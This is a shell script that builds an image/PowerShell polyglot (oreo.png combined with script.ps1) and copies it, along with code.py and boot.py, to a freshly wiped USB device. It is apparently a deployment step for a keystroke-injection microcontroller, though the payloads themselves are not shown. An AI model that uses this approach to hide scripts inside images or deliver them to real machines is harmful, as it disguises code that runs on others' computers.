set -xe

if [ "$1" == "IMG" ]; then
convert oreo3.png -resize 50% -quality 50 oreo3-1.png
pngquant oreo3-1.png -f
fi

python polyglot.py oreo3-1-fs8.png oreo.png script.ps1

set +x
while ! $(df | grep -q P); do echo waiting; sleep .2; done;

sleep 2
set -x

MTPATH="/run/media/karmanyaahm/P"

# delete all dirs
find $MTPATH -mindepth 1 -type d -exec rm -rf {} ';' || true
find $MTPATH -mindepth 1 -type d -exec rm -rf {} ';' || true
find $MTPATH -mindepth 1 -type d -exec rm -rf {} ';' || true

cp -u code.py boot.py oreo.png $MTPATH/
sync $MTPATH $MTPATH/ $MTPATH/code.py $MTPATH/oreo.png $MTPATH/boot.py
touch $MTPATH/oreo.png
sleep 1 
umount $MTPATH
